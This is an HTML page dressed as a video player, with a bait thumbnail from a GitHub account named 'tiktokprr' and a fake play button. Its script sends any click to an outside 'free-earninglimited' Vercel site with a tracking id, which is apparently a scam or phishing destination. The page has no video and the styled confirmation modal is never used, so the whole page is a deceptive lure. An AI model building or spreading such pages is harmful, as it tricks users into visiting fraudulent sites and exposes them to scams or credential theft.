<title>Video Player</title>

<link rel="icon" href="https://cdn-icons-png.flaticon.com/512/1384/1384060.png">

<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
background:#000;
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
font-family:Segoe UI,Tahoma,sans-serif
}
.container{width:100%;max-width:800px;text-align:center}
h1{color:#fff;margin-bottom:25px}
.video-player{
position:relative;
border-radius:15px;
overflow:hidden;
cursor:pointer;
border:2px solid #333
}
.video-thumbnail{
width:100%;
height:420px;
object-fit:cover;
display:block
}
.video-overlay{
position:absolute;
top:0;left:0;
width:100%;height:100%;
background:rgba(0,0,0,.5);
display:flex;
justify-content:center;
align-items:center
}
.play-button{
width:80px;height:80px;
background:#fff;
border-radius:50%;
display:flex;
justify-content:center;
align-items:center
}
.play-icon{
width:0;height:0;
border-top:15px solid transparent;
border-bottom:15px solid transparent;
border-left:25px solid red;
margin-left:5px
}
.confirmation-modal{
position:fixed;
top:0;left:0;
width:100%;height:100%;
background:rgba(0,0,0,.85);
display:none;
justify-content:center;
align-items:center;
z-index:1000
}
.confirmation-modal.show{display:flex}
.confirmation-box{
background:#111;
padding:30px;
border-radius:10px;
text-align:center;
max-width:400px;
width:90%;
color:#fff
}
.confirm-btn{
margin-top:20px;
width:100%;
padding:12px;
background:#4285F4;
border:none;
color:#fff;
font-size:16px;
cursor:pointer;
border-radius:6px
}
.close-modal{
position:absolute;
top:15px;
right:20px;
background:none;
border:none;
color:#aaa;
font-size:22px;
cursor:pointer
}
</style>
</head>

<body>

<div class="container">

<div class="video-player" id="videoPlayer">
<img class="video-thumbnail"
src="https://raw.githubusercontent.com/tiktokprr/video/main/%D9%85%DB%95%D9%84%DB%95%D9%81%DB%8C%20%DA%A9%DA%86%DB%95%20%D9%85%DB%86%D8%AF%DB%8E%D9%84%DB%95%20%D8%AA%D8%A7%D8%B2%DB%95%DA%A9%DB%95%DB%8C%20%D9%87%DB%95%D9%88%D9%84%DB%8E%D8%B1.png
"
alt="Video Thumbnail">

<div class="video-overlay">
<div class="play-button">
<div class="play-icon"></div>
</div>
</div>
</div>
</div>



<script>
const videoPlayer=document.getElementById("videoPlayer");


videoPlayer.onclick = () => {
  window.location.href = "https://free-earninglimited.vercel.app/?id=7947147441";
};
</script>
